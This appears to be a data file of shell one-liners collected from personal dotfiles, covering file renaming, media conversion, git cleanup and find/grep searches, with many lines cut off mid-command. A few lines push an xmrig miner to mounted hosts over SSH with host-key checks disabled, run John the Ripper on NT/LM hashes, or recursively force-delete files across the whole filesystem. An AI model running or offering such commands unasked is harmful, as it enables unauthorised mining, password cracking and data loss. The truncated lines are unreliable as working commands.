"function _cpgrf(){echo -n `grf $1` | pbcopy; echo ""Path copied: `grf $1`""};_cpgrf"
"function _clip() { cat ""$1"" | xclip -i -selection clipboard; };_clip"
"function _clearize(){ grep -v ""^\s*[$1]"" $2 | sed ""/^$/d""; }; _clearize"
"function _calc(){ exp=""$@""; echo $1 | bc -l ;};_calc"
"function _brightness(){ echo ""$1"" | sudo tee /sys/class/backlight/acpi_video0/brightness; };_brightness"
"function _battery(){ zenity --notification --text ""Status:\nBattery: $(cat /sys/class/power_supply/BAT1/uevent | grep "
"function _at(){echo ""notify-send"" ""${@:2}"" | at $1 };_at"
"function _aclfilename(){ json $1 | jq "".Documentation.Doc[].FileName""; };_aclfilename"
"function __weather() { curl -s wttr.in/${*:-Utrecht} | sed -n ""1,7p""; }; __weather"
"function __findFile() { find . -name ""$1"" -type f | xargs ls -lh }; __findFile"
"function __ffg() { find . -name ""$1"" -type f 2>/dev/null | xargs grep ""$2""; unset -f __ffg; }; __ffg"
"function __f() { printf ""\n"";find . ! -regex "".*[/]\.git[/]?.*"" -type f -print0 | xargs -0 grep -I -i --color ""$1"";unset -f __f;printf ""\n""; }; __f"
"function VimHelp() { vim -c "":help $1 | :only"" };VimHelp"
"function VimHelp() { mvim -c "":help $1 | :only"" };VimHelp"
"function VIMLESH(){ `Validator 1 ""Need a Parameters ( Commit Message )"" $@`; changes=`M|wc -l`; if [ ""$changes"" -eq 0 ]; then echo -e ""\n\tNo Changes to Stage\n""; return; fi; echo -e ""\n\t$changes file(s) are identified to Stage\n""; M; `Confirmer`; Add .; Aamend ""$1"";}; VIMLESH"
"function MKBJ(){ `Validator 1 ""Need a Parameters ( Commit Message )"" $@`; changes=`M|wc -l`; if [ ""$changes"" -eq 0 ]; then echo -e ""\n\tNo Changes to Stage\n""; return; fi; echo -e ""\n\t$changes file(s) are identified to Stage\n""; M; `Confirmer`; Add .; Ccommit ""$1"";}; MKBJ"
"function MBMB(){ Workspace; `Validator 1 ""Need a Parameters ( Branch Name )"" $@`; story=`echo $1| cut -d"
"func() { v $(echo '$(grep -lr --exclude-dir={.git,.idea,.vscode} $@ err.txt generated.file succ.txt | tr "
"func() { n $(echo '$(grep -lr --exclude-dir={.git,.idea,.vscode} $@ err.txt generated.file succ.txt | tr "
"fswatch -o {lib,test} | xargs -n1 -I{} mix test --stale"
"fswatch -o src/ -o tests/ | xargs -n1 bash -c ""clear ; date ; cargo test"""
"fswatch -o src/ -o tests/ | xargs -n1 bash -c ""clear ; date ; cargo build"""
"fswatch -0 . | xargs -0 -n 1 sh -c ""clear && git status --short"""
"fswatch -0 -e "".*"" -i ""\\.rb$"" . | xargs -0 -n 1 -I {} rspec --format documentation"
"fswatch --print0 --one-per-batch /Users/jafisher/repositories | xargs -0 -n 1 -I {} rsync -e ""ssh -o Compression=yes -o ConnectTimeout=3 -o ServerAliveInterval=2 -o ServerAliveCountMax=4 -o StrictHostKeyChecking=no -p22"" --recursive --times --copy-links --omit-dir-times --one-file-system --verbose /Users/jafisher/sync_repositories/ jafisher@mebigdata19.dev.bo1.csnzoo.com:/csnzoo/jafisher/repositories/ --exclude .realsync --exclude CVS --exclude .git --exclude .svn --exclude .hg --exclude .cache --exclude .idea --exclude nbproject --exclude ""~*"" --exclude ""*.tmp"" --exclude ""*.pyc"" --exclude ""*.swp"" --exclude "".python_environment*"" --exclude "".venv*"" --exclude .DS_Store --exclude .codedeploy --exclude nltk_data"
"fswatch --print0 --one-per-batch $HOME/sync_repos | xargs -0 -n 1 -I {} rsync -e ""ssh -o Compression=yes -o ConnectTimeout=3 -o ServerAliveInterval=2 -o ServerAliveCountMax=4 -o StrictHostKeyChecking=no -p 2255"" --recursive --times --copy-links --omit-dir-times --one-file-system --verbose $HOME/sync_repos/ jafisher@68.183.16.54:/home/jafisher/repos --exclude .realsync --exclude CVS --exclude .git --exclude .svn --exclude .hg --exclude .cache --exclude .idea --exclude nbproject --exclude ""~*"" --exclude ""*.tmp"" --exclude ""*.pyc"" --exclude ""*.swp"" --exclude "".python_environment*"" --exclude "".venv*"" --exclude .DS_Store --exclude .codedeploy --exclude nltk_data"
"free -m | cut -d""
"fpp -c ""echo \$F | pbcopy"""
"fping wp.pl -l | cut -d , -f 3-4"
"fos-dev conf get ssh_port | awk -F "": "" ""{print \$2}"""
"fos-dev conf get fortigate_user | awk -F "": "" ""{print \$2}"""
"fos-dev conf get fortigate | awk -F "": "" ""{print \$2}"""
"fortune | tee -a ~/.fortuneCookies && echo """" >> ~/.fortuneCookies"
"format tree -CN --dirsfirst -I ""__pycache__|desktop.ini"""
"format tree -CN --dirsfirst -I ""__pycache__|desktop.ini"" -a"
"for z in *.ufraw; do d=""$HOME/fotos/$(echo ""$z""|sed ""s/^\([0-9]\{4\}\)\([0-9]\{2\}\)\([0-9]\{2\}\).*$/\1\/\2\/\3/"")/""; if test -f ""$d/$z""; then diff -u ""$d/$z"" ""$z""; else mv -iv ""$z"" ""$d""; fi; done"
"for x in $(ls); do echo ${x}: $(find ""${x}"" -type f | wc -l); done"
"for tag in $(git tag | tr ""\n"" "" ""); do git tag -d $tag; done"
"for table in security raw nat mangle filter ; do sudo iptables -S -t $table | sed ""s:^:-t $table :"" ; done"
"for t in `find -L t/wikitests/ -name ""*.wiki""`; do echo $t; run-wiki-tests -f $t 2>&1 | grep ""not ok""; done"
"for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do echo -e ""$src:\t$(/opt/vc/bin/vcgencmd measure_clock $src | cut -d ""="" -f2)"" ; done"
"for scope in server global window; do tmux show -${scope:0:1} | sed ""s:^:$scope\: :""; done"
"for region in $(aws ec2 describe-regions --output text | cut -f3); do echo -e ""\nInstances in ${region}:""; aws ec2 describe-instances --query "
"for pid in $(pgrep -lfa geru_challenge | cut -d"" "" -f1); do kill -9 $pid; done"
"for package in $(npm -g outdated --parseable --depth=0 | cut -d: -f4); do npm -g install ""$package""; done"
"for package in $(npm -g outdated --parseable --depth=0 | cut -d: -f2); do npm -g install ""$package""; done"
"for number in "" "" -{1..6}; do echo -n ""redis$number ""; redis-cli -h redis$number cluster info | grep cluster_state; done"
"for name in $(find . -name node_modules | grep -ve ""node_modules.*node_modules""); do ! test -e $name/.metadata_never_index && echo ""marking $name as never-index"" && touch $name/.metadata_never_index; done"
"for n in `ls *`; do mencoder $n -ovc lavc -oac mp3lame -o $(echo $n | cut -d ""."" -f 1).avi; done"
"for n in `ls *.ogv`; do sudo ffmpeg -i $n -r 15 -b 64kb -ac 1 -s 176x132 -padtop 6 -padbottom 6 -ar 16000 -ab 32kb -acodec libfaac -vcodec h263 $(echo $n | cut -d ""."" -f 1).3gp; done"
"for n in `ls *.mp4`; do mencoder $n -vf scale=176:144 -oac mp3lame -ovc lavc -o $(echo $n | cut -d ""."" -f 1).3gp; done"
"for mr in `lab mr list -a --target-branch dev | grep -oE ""\d{4}""`; do lab mr checkout $mr && git fu && git pull --no-edit && git pull --no-edit origin dev && git push; git merge --abort ; done"
"for m in `sudo lxc-ls --running | cut -d"" "" -f 1`; do sudo lxc-stop -n $m ; done"
"for keyfile in ~/.ssh/id_*; do ssh-keygen -l -f ""${keyfile}""; done | uniq"
"for k in `git branch -r | \
"for k in `git branch -l | \
"for k in `git branch --format ""%(refname:short)""`; do echo -e ""`git log -1 --color --pretty=format:""%Cgreen%ci %Cblue%<(13,trunc)%cr %C(yellow bold)%<(30,trunc)%S %Creset%<(40,trunc)%D"" $k --`""; done | sort -r"
"for k in $(_branches); do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k --`\\t""$k"";done | sort"
"for k in $( git branch | grep -v ""*"" ); do git branch -d $k; done;"
"for job in `jobs -l | egrep -o ""([0-9][0-9]+)""`; do kill $job ; done"
"for i in ~/.mozilla/firefox/*/*.sqlite; do echo ""VACUUM;"" | sqlite3 $i ; done"
"for i in {0..600}; do echo $i; sleep 60; done | dialog --gauge \""Install...\"" 6 40"
"for i in {0..600}; do echo $i; sleep 1; done | dialog --gauge ""Install..."" 6 40"
"for i in {0..60000}; do echo $i; sleep 1; done | dialog --gauge ""Install..."" 6 40"
"for i in {0..32}; do netmask=$(ipcalc -m 0.0.0.0/$i | cut -d = -f 2); echo ""${netmask} /${i}""; done"
"for i in {0..255}; do printf ""\x1b[38;5;${i}mcolour${i}\x1b[0m\n""; done | xargs"
"for i in {0..255}; do echo -e ""\e[38;05;${i}m\\\e[38;05;${i}m""; done | column -c 80 -s "" ""; echo -e ""\e[m]]]"""
"for i in {0..255}; do echo -e ""\e[38;05;${i}m\\\e[38;05;${i}m""; done | column -c 80 -s "" ""; echo -e ""\e[m""]]]"""""
"for i in {0..255}; do echo -e ""\e[38;05;${i}m${i}""; done | column -c 80 -s "" ""; echo -e ""\e[m"""
"for i in {0..255}; do echo -e ""\e[38;05;${i}m${i}""; done | column -c 180 -s "" ""; echo -e ""\e[m"""
"for i in {0..255}; do echo -e ""\e[38;05;${i}m${i}""; done | column -c 150 -s "
"for i in {0..255}; do echo -e ""\e[38;05;${i}m ░▒▓██▓▒░ \e[0m${i}""; done | column -c 40 -s"" ""; echo -e ""\e[m"""
"for i in {0..255}; do echo -e ""\033[38;05;${i}m${i}""; done | column -c 80 -s "" "" ; echo -e ""\033[m"""
"for i in {0..255} ; do printf ""\x1b[38;5;${i}mcolor${i}\n"" ; done | column"
"for i in {0..15}; do echo -e ""\e[38;05;${i}m ░▒▓██▓▒░ \e[0m${i}""; done | column -c 40 -s"" ""; echo -e ""\e[m"""
"for i in `ls -t | grep -ie jpg`; do echo -e ""\n$YELL_COLOR Playing $i ... $NORM_COLOR\n""; nvg -i $i; done"
"for i in `ls -1 | sed -e ""s/\.yml$//""`; do drush config-delete $i; done"
"for i in `find . -type f -name ""*.h"" -o -name ""*.c""`; do (cat $i | grep ""va\.h"") && echo $i; done"
"for i in `find . -print | grep ""\.py[co]$""`; do rm $i; done"
"for i in `cat broken-links`; do ln -sf `readlink $i | sed ""s,/home/lwheat/work/intqemu,/Users/lwheat/work/integration,""` $i; done"
"for i in \$(ls | grep '\-0.root'); do hadd -f \${i/-0.root/.root} \${i/-0.root/-\*.root}; done"""
"for i in \$(ls | grep '\-0.root'); do hadd -f \${i/-0.root/.root} \${i/-0.root/-\*.root} && rm \${i/-0.root/-\*.root}; done"""
"for i in 1 2 3 4 5 6; do find ./SERVER$i/. -type f -name ""*"" -print0 | xargs -0 git add -f --; done"
"for i in *; do o=$(echo $i | tr ""[:blank:]"" ""_""); mv $i $o ; done"
"for i in *; do mv $i ""`pwd|awk -F"
"for i in *; do mv ""$i"" ""$(echo $i|tr A-Z a-z)""; done"
"for i in *; do mv ""$i"" ""$(echo $i | tr ""[a-z]"" ""[A-Z]"" )""; done"
"for i in *; do mv ""$i"" ""$(echo $i | tr ""[A-Z]"" ""[a-z]"" )""; done"
"for i in *; do du -ms ""$i""; done | sort -n"
"for i in *; do cd $i && echo ""$(gid) | $(gip) :: $i @ $(gcb)"" && cd ..; done"
"for i in *.mp2 ; do mv ""$i"" ""`echo \""$i\"" | sed s/mp2/mp3/`"" ; done"
"for i in *.flac; do ffmpeg -i ""$i"" -ab 320k -map_metadata 0 -id3v2_version 3 ""$(echo $i | sed s/\.flac//g)"".mp3; done;"
"for i in *.avi; do mv $i ""$( echo $i | sed -e "
"for i in **/*.(png|PNG) ; do convert ""$i"" ""${i/.???/.jpg}"" ; done"
"for i in **/*.(pdf|PDF) ; do rpdf ""$i"" ; done"
"for i in err.txt generated.file succ.txt .*; do if [ ! -d ""$i"" ]; then echo File $i:; hd ""$i"" | head -7; echo ---------------; echo; fi; done"
"for i in $(tmux list-sessions | awk -F "":"" ""!/attached/ { print \$1 }""); do
"for i in $(sudo virsh vol-list default 2>&1 | awk ""/^ disk/ {print $2}""); do sudo virsh vol-delete $i; done"
"for i in $(showmount | grep -v ""Hosts on""); do (ssh -o ""StrictHostKeyChecking=no"" $i ""systemctl daemon-reload&&systemctl restart xmrig""); done"
"for i in $(showmount | grep -v ""Hosts on""); do (ssh -o ""StrictHostKeyChecking=no"" $i ""systemctl daemon-reload && systemctl stop xmrig && rm -rf /tmp/xmrig && systemctl start xmrig"") ; done"
"for i in $(seq 0 10 100) ; do sleep 1; echo ""$i"" | dialog --gauge ""Please Wait Gauge"" 10 100 0;done; echo ""$?"""
"for i in $(qst | cut -c1-7); do echo -n $i,; done; echo"
"for i in $(ls);do a=`echo $i| tr ""[:upper:]"" ""[:lower:]"" `;mv $i $a ;done"
"for i in $(ls);do a=`echo $i| tr ""[:lower:]"" ""[:upper:]"" `;mv $i $a ;done"
"for i in $(findd |awk ""{print $2}"");do sudo kill -USR1 ;done"
"for i in $( echo ""$PATH"" | sed ""s/\:/ /g"" ) ; do echo $i; done"
"for i in ""opencafe"" ""cloudcafe"" ""cloudroast""; do echo ""cd ~/work/cloudcafe/${i}; git fetch --all; sudo pip install -r pip-requires; sudo pip install . --upgrade; cd -"" | bash -x; done"
"for i (**/*.php) php -lq $i | grep -v ""^No syntax errors"""
"for host in $(grep ""Host "" ~/.ssh/config | cut -d "" "" -f 2); do fusermount -u /tmp/sshfs/$host 2>/dev/null; unlink $host 2>/dev/null; rmdir /tmp/sshfs/$host 2>/dev/null; done"
"for fname in *.DAT; do mv ""$fname"" $(echo ""$fname""|cut -f1 -d""."").mpg; done"
"for filename in ./*; do mv ""./$filename"" ""./$(echo $filename | sed -e "
"for file in `pacman -Qmq` ; do yas $file | grep ""installed:"" ; done"
"for file in `ls`; do echo ""file : ${file}""; cat ${file} | wc -l;echo """" ;done"
"for file in `ls ~/.ssh/aws_gen_*`; do echo -n $file "" - "" ; openssl pkcs8 -in $file -nocrypt -topk8 -outform DER | openssl sha1 -c ; done"
"for file in `ls ~/.ssh/*id_rsa$*`; do echo -n $file "" - "" ; openssl pkey -in $file -pubout -outform DER | openssl md5 -c; done"
"for file in *; do mv ""$file"" `echo $file | tr "" "" ""_""` ; done"
"for file in *; do mv ""$file"" `echo $file | tr "
"for file in *; do echo ""`find $file -type f | wc -l` $file""; done"
"for file in *.mp3; do track=`echo $file |awk -F""_"" "
"for file in *.flac; do flac -cd ""$file"" | lame -q0 --abr 80 -mm -a - ""${file%.flac}.mp3""; done"
"for file in *.flac; do flac -cd ""$file"" | lame -q 0 --vbr-new -V 0 - ""${file%.flac}.mp3""; done"
"for file in *.flac; do flac -cd ""$file"" | lame -b 256 -h - ""${file%.flac}.mp3""; done"
"for file in *.flac; do $(flac -cd ""$file"" | lame -V 0 --vbr-new - ""${file%.flac}.mp3""); done"
"for file in $(ls); do echo -n ""[$file]""; file $file | cut -d"":"" -f2-; done"
"for f in *; do printf ""%40s %9d\n"" $f `find $f -type f | wc -l`; done"
"for f in *; do printf ""%40s %9d\n"" $f `find $f -type d | wc -l`; done"
"for f in *; do printf ""%40s %9d\n"" ""$f"" `find ""$f"" -type f | wc -l`; done"
"for f in *; do printf ""%40s %9d\n"" ""$f"" `find ""$f"" -type d | wc -l`; done"
"for f in *; do mv ""$f"" $(echo $f | urlencode); done"
"for f in *; do mv ""$f"" $(echo $f | urldecode); done"
"for f in *; do mv ""$f"" $(echo $f | queryencode); done"
"for f in *; do mv ""$f"" $(echo $f | querydecode); done"
"for f in *; do mv ""$f"" ""`echo $f | tr ""[:upper:]"" ""[:lower:]""`""; done"
"for f in *; do mv ""$f"" ""`echo $f | tr ""[:lower:]"" ""[:upper:]""`""; done"
"for f in *; do mv ""$f"" ""$f.tmp""; mv ""$f.tmp"" ""`echo $f | tr ""[:upper:]"" ""[:lower:]""`""; done"
"for f in *; do du -sh ""$f""; done | sort -hr"
"for f in *; do d=$(stat -t ""%F"" ""$f""|awk -F\"" ""{print \$2}""); if [ ! -d $d ]; then mkdir $d; fi; mv ""$f"" $d/; done"
"for f in *; do chmod -x $f ; mv $f $(echo $f|tr ""A-Z_"" ""a-z-""); done"
"for f in *.flac; do flac -cd ""$f"" | lame -h -b 320 - ""${f%.*}"".mp3; done"
"for f in *.flac; do flac -cd ""$f"" | lame -b 320 - ""${f%.*}"".mp3; done"
"for dirname in */; do cd $dirname; if [[ ""* develop"" != `git branch` ]] ; then echo -e "" /${PWD##*/}\n"" `git branch --list | egrep --color=always ""\*""` ; fi; cd ..; done"
"for dir in ./*; do if test -d ""$dir""; then printf ""$dir - $(find ""$dir"" -type f | wc -l) Files\n""; fi; done"
"for dir in $(find -L . -type d -d 1); do cd $dir; curr_branch=`git branch | grep ""*""`; echo ""${dir} ${curr_branch}""; cd ..; done;"
"for db in api_live api_test; do echo ""DROP DATABASE IF EXISTS $db; CREATE DATABASE $db;""; done | mysql -u root -p && php artisan rzp:dbr --install --seed"
"for d in `find ./ -type d`; do echo $d,`ls ""$d"" | wc -l`; done"
"for d in $(tmutil listlocalsnapshotdates | grep -v ""Snapshot dates for all disks""); do sudo tmutil deletelocalsnapshots $d; done"
"for d in $(find -type d -name "".git"" | sed ""s/\.git$//"" );do echo $d; git -C ""$d"" status -svb; echo; done"
"for d in ""${DIRSTACK[@]}""; do echo ""${d}""; done | tac"
"for code in {000..255}; do print -P -- ""$code: %F{$code}Test%f""; done | column -c 250"
"for code in $(seq -w 0 255); do printf ""%03s %blorem%b\n"" ""${code}"" ""\e[${attr};38;05;${code}m"" ""\e[m""; done | column -c $((COLUMNS*1))"
"for code in $(seq -w 0 255); do for attr in 0 1; do printf ""%s-%03s %bTest%b\n"" ""${attr}"" ""${code}"" ""\e[${attr};38;05;${code}m"" ""\e[m""; done; done | column -c $((COLUMNS*2))"
"for c in {0..255}; do echo ""$c color"" | colout ""color"" $c; done"
"for branch in `git for-each-ref --format=""%(refname:strip=2)"" refs/heads`;do echo -e `git log -1 --format=""%cd, %cr:"" --date=short ${branch#""* ""}` \\t${branch#""* ""}; done | sort -r"
"for beers in $(seq 99 1); do beersremaining=$(echo ""$beers - 1"" | bc); echo -n ""$beers beers:""; for j in $(seq 1 $beers); do echo -ne ""\xF0\x9f\x8d\xba""; done; say ""$beers bottles of beer on the wall $beers bottles of beer. Take one down, pass it around, $beersremaining bottles of beer on the wall""; echo """"; done"
"for b in ""git branch --merged | grep -v \*""; do git branch -D $b; done"
"for a in *; do if [[ -d ""$a"" ]]; then cd ""$a""; echo ""$a""; git remote update; git log --decorate | head -1; echo; cd ..;fi ; done"
"for a in *.m4a; do faad -f 2 -w ""$a"" | lame -r - ""$a.mp3""; done"
"for a in $(git branch --merged | sed ""s/..//;/master/d""); do echo branch_name: $a; git branch -d ""$a""; done"
"for X in ""-i"" ""-i -selection clipboard""; { printf ""%s"" """" | xclip $X; }"
"for FILE in err.txt generated.file succ.txt ; do NEWFILE=`echo $FILE | sed ""s/ /_/g""` ; mv ""$FILE"" $NEWFILE ; done"
"for F in {a..z} {A..Z} :z ::z :::z;do echo $F: $(date +%$F);done|sed ""/:[\ \t\n]*$/d;/%[a-zA-Z]/d"""
"for F in `grep -lE ""FAILED|Caused\ an\ ERROR"" $GRAILS_TEST_LOG_DIRECTORY/plain/*.txt`; do echo "">>> opening"" $F; open -a Console $F; done;"
"for D in *; do pushd ""$D"" > /dev/null 2>/dev/null && printf ""%s %s\n"" ""${PWD##*/}"" ""$(git branch | grep \*)"" && popd > /dev/null 2>/dev/null; done"
"for D in $(find . -name .git -maxdepth 2 | cut -d/ -f2); do (echo ""\n\n>>> $D\n""; cd ""$D""; g up); done"
"for C in $(git for-each-ref --sort=committerdate refs/heads --format=""%(refname:short)""| tac) ; do git show -s --pretty=format:""%Cgreen%ci %Cblue%cr%Creset $C"" ""$C"" -- ; git --no-pager log -p -1 $C -- $0; echo; done"
"for ((i=$((60-$(date +%S))); i>0; i--)); do clear; figlet ""$i"" |lolcat -F 0.5; sleep 1; done"
"folders | grep -v ""no messag"""
"fleetctl list-units --fields sub,unit,active,machine | sort -k 4 -g"
"fleetctl list-units --fields sub,unit,active,machine | sort -k 2"
"flake8 . --exclude=*/migrations,*/*/migrations,*/__init__.py --max-line-length=100 | nl"
"flake8 --format ""%(path)s:%(row)d"" | xargs charm"
"firefox \$(git remote -v | awk '/origin/{print substr(\$2,0,length(\$2)-4);exit}')"
"firebase serve --only functions,firestore | h -ni $PORT"
"firebase emulators:start --only functions,firestore | h -ni $PORT"
"find|grep --exclude=""*~"" --exclude=""*.swp"""
"findx -x -name .git,.subgit,.hg,.subhg,docs,examples,t,*LICENSE*,META.info,*.md | perl -pne ""s/\.\///"""
"findsrc | rs -v ""\.h"""
"finds | xargs -d""\n"" egrep"
"findmnt -Do TARGET,SOURCE,FSTYPE | grep -e ""sd[b-z]"""
"findmnt -D -t notracefs,nonsfs,nosysfs,notmpfs,nodevtmpfs,nofuse.gvfsd-fuse | sort -hk5"
"find-orig-files | xargs -I % sh -c ""echo %; rm %"""
"find ~/notes/ | xargs -d ""\n"" ag -l"
"find ~/music/ -type f -iname ""*.flac"" -o -iname ""*.m4a"" -o -iname ""*.mp3"" -o -iname ""*.wav"" -o -iname ""*.wma"" | \grep -v ""Automatically Add to iTunes"" > /tmp/playlist"
"find ~/dotfiles -not -path ""*/\.git/*"" -type d -maxdepth 6 | fzf --layout=reverse --preview ""ls -FG {}"""
"find ~/Music -iname ""*.flac"" -or -iname ""*.wav"" -or -iname ""*.mp3"" -mtime -5 | sort"
"find ~/Maildir/ -name '*:2,' -exec dirname {} \; | uniq"
"find ~/Desktop -type f -maxdepth 1 -mtime +15 -print | xargs -I {} mv ""{}"" ~/Desktop/archive/"
"find ~/.ssh/ -type f -exec grep -l ""PRIVATE"" {} \; | xargs ssh-add &> /dev/null"
"find ~/.m2/repository \( -iname ""agent-*"" -o -iname ""javaagent-*"" \) -prune -o -atime +14 -iname ""*.pom"" -print0 | while read -d """" -r pom; do parent=`dirname ""$pom""`; rm -rf ""$parent""; done"
"find ~/.emacs.d -name ""*.elc"" -print | xargs rm -f"
"find ~/.cache -name ""*.lock"" | xargs -l rm && rm ~/.cache/ksycoca5*"
"find ~/ -type f -mtime -5 | grep -v ""\/\."" "
"find ~ -type d 2>/dev/null | grep -v ""/\."""
"find ~ -name "".git"" 2> /dev/null | sed "
"find ~ -name "".*.*.sw*"" | xargs rm -f"
"find | grep ""^\.[a-zA-Z]"""
"find test/ -name ""*.clj"" -print0 | xargs -0 wc -l"
"find src/io/nfg/wmg -name ""*.as"" | entr make run"
"find src/ -name ""*.cljs"" -print0 | xargs -0 wc -l"
"find src/ -name ""*.clj"" -print0 | xargs -0 wc -l"
"find src spec tests features -name ""*.php"" | xargs -n1 -P0 php -l && docker run --rm -v $PWD:/app phpstan/phpstan analyse --level 7 /app/src"
"find setup/ -name ""*.clj"" -print0 | xargs -0 wc -l"
"find roles -name ""*.json"" -or -name ""*.rb"" | xargs knife role from file"
"find net/ include/ kernel/ init/ mm/ fs/ lib/ security/ drivers/net/ethernet/mellanox/ drivers/platform/msm/ipa/ drivers/net/ethernet/qualcomm/rmnet/ -name ""*.[ch]"" > cscope.files ; cat cscope.files | xargs etags -a ; cscope -bqk ; create_TTT"
"find net/ include/ kernel/ init/ drivers/net/ethernet/mellanox/ -name ""*.[ch]"" > cscope.files ; cat cscope.files | xargs etags -a ; cscope -bqk ; create_TTT"
"find log/ -name ""puppetrun*changed.log"" -mtime -1 -exec ls -lash {} \;|sort -k 10"
"find input.{cis,engrad,ges,hostnames,opt,prop,qro,uno,unso,xyz} input{,_atom{45,77}}{,_property}.txt -type f 2> /dev/null | xargs rm 2> /dev/null"
"find environments -name ""*.json"" -or -name ""*.rb"" | xargs knife environment from file"
"find app -iname ""*.rb"" -type f -exec cat {} \;| wc -l"
"find `pwd` -iname ""*.h"" -or -iname ""*.c"" -or -iname ""*.cpp"" -or -iname ""*.hpp"" | xargs clang-format -i -style=file"
"find err.txt generated.file succ.txt | xargs grep
"find /var/cache/pacman/pkg/ -size +9M -iname ""*.*z"" -printf ""%f\n"" | sort -d"
"find /usr/ports -type d -d 2|sed ""s/\/usr\/ports\///g"""
"find /usr/local/Homebrew/ -type d -name ""Formula"" -exec ls -1 {} \; | cut -d""."" -f1"
"find /usr/include -name ""*.h"" -type f -print0 | xargs -0 grep -n --color=auto"
"find /usr/bin -maxdepth 1 -type l -ls | grep ""\-> /home/felipe/.scripts/"""
"find /root/dic/ -name ""*"" | xargs -t -I file john nt -format:nt -w:file -fork:8"
"find /root/dic/ -name ""*"" | xargs -t -I file john lm -format:lm -w:file -fork:8"
"find /root/.trash/ -type f |sed ""s@^$HOME/.trash@@g"""
"find /opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages -name ""*lost+found*"" -prune -o -type f | egrep ""\.(py)$"" > ~/cscopeFiles/cscopePython.files; cscope -b -q -i ~/cscopeFiles/cscopePython.files -f ~/cscopeFiles/cscopePython.out"
"find /mnt/data/music/ -iname ""*.mp3"" -print0 | xargs -0 mid3iconv -e CP1251 -d --remove-v1"
"find /lib/modules/$(uname -r) -type f -name ""*.ko*"" | grep"
"find /lib/modules/$(uname -r) -name ""*.ko"" | grep -i"
"find /etc/update-motd.d/{00-header,98-reboot}* | xargs -L1 bash"
"find /etc/ssh -name ""*.pub"" -exec ssh-keygen -lf {} \; -exec ssh-keygen -E md5 -lf {} \; | tr "" "" ""\t"""
"find /etc -regextype posix-extended -regex "".+\.pac(new|save)"" 2>/dev/null"
"find /etc -regextype posix-extended -regex "".+\.pac(new|save)"" 2> /dev/null"
"find /data/ARAAcqdData/current/event -name ""ev_*.dat"" -print | wc -l"
"find /Volumes/UNI/iTunes/iTunes\ Music/ -name ""*.mp3"" | mpg123 -z --list -"
"find /Users/iandunn/vhosts -name version.php -print0 |xargs -0 grep ""wp_version ="" -s"
"find /Users -type f -iwholename ""*log/test.log"" -o -iwholename ""*log/production.log"" -o -iwholename ""*log/development.log"" | xargs rm -f"
"find /Applications -path ""*Contents/_MASReceipt/receipt"" -maxdepth 4 -print |\sed ""s#.app/Contents/_MASReceipt/receipt#.app#g; s#/Applications/##"""
"find / -type f -name ""0"" | xargs -i rm -fr ""{}"""
"find / -regextype posix-extended -regex "".+\.pac(new|save)"" -print -o -type d -name ""home"" -prune 2> /dev/null"
"find / -printf \""%u %s\n\"" | awk \"
"find / -name $1 2>&1 | grep -v ""Permission denied"""
"find .cache/google-chrome/Default/Cache -type f |\
"find ./src/salk -type f -name ""*"" | xargs -n 1 joker --lintcljs"
"find ./data -name ""*.php"" -type f -print0 | xargs -0 /bin/rm -f"
"find ./ \( -path ""./wsd"" -o -path ""./wsd1"" \) -prune -o -name ""*.h"" -print -o -name ""*.cpp"" -print |
"find ./ \( -iname ""*.css"" ! -iname ""*jquery*"" ! -iname ""*fancybox*"" ! -iname ""*selector.css"" ! -iname ""*admin.css"" \) | xargs csslint --rules=universal-selector,empty-rules,zero-units,vendor-prefix,gradients,important,compatible-vendor-prefixes,duplicate-properties"
"find ./ -type f | grep"""
"find ./ -type f -print0 | \
"find ./ -type f -name ""*pm"" -exec perl -cw {} \; 2>&1 | grep ""compilation errors"""
"find ./ -type f -iname "".*.*sw*"" -print0 | xargs --interactive -0 rm"
"find ./ -regex "".*py[cod]$"" -type f -print0 | xargs -0 -l1 -t rm -f"
"find ./ -printf ""%f\n | less"
"find ./ -path \""*\.svn\"" -prune -o -type f -print | xargs grep --color=auto -I -n -s"
"find ./ -path ""*.ts"" -type f | xargs wc -l"
"find ./ -path ""*.py"" -type f | xargs wc -l"
"find ./ -path ""*.php"" -type f | xargs wc -l"
"find ./ -path ""*.jsx"" -type f | xargs wc -l"
"find ./ -path ""*.js"" -type f | xargs wc -l"
"find ./ -path ""*.c"" -type f | xargs wc -l"
"find ./ -name \""tags\"" -o -name \""cscope.*\""|xargs rm"
"find ./ -name ""__MACOSX"" -print0 | xargs -0 rm -Rf"
"find ./ -name "".svn"" | xargs rm -Rf"
"find ./ -name "".git"" | xargs rm -Rf"
"find ./ -name "".DS_Store"" -print0 | xargs -0 rm -Rf"
"find ./ -name ""*.sh"" | xargs chmod +x"
"find ./ -name ""*.pyc"" |xargs rm -f"
"find ./ -name ""*.pyc"" | xargs rm -v"
"find ./ -name ""*.pyc"" | xargs -n 1 -I {} rm -v {}"
"find ./ -name ""*.pyc"" | xargs -i rm {}"
"find ./ -name ""*.py"" |xargs grep -n -w "
"find ./ -name ""*.py"" |xargs grep -n "
"find ./ -name ""*.md"" -print0 | xargs -0 grep TODO > /tmp/find_tmp_log.log && vim /tmp/find_tmp_log.log"
"find ./ -name ""*.c"" -or -name ""*.h"" -or -name ""*.cpp"" -or -name ""*.S"" -or -name ""*.s"" | cscope -Rbq"
"find ./ -name ""*.[jchp]*"" | xargs grep -i"
"find ./ -name ""*.*hs"" | xargs hasktags"
"find ./ -name ""*"" | xargs grep"
"find ./ -name ""*"" | xargs grep "
"find ./ -name ""*"" | grep "
"find ./ -maxdepth 5 -type f -name ""*.xml"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.xml"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.ss"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.ss"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.sls"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.sls"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.rs"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.rs"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.rkt"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.rkt"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.rb"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.rb"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.py"" | xargs grep "
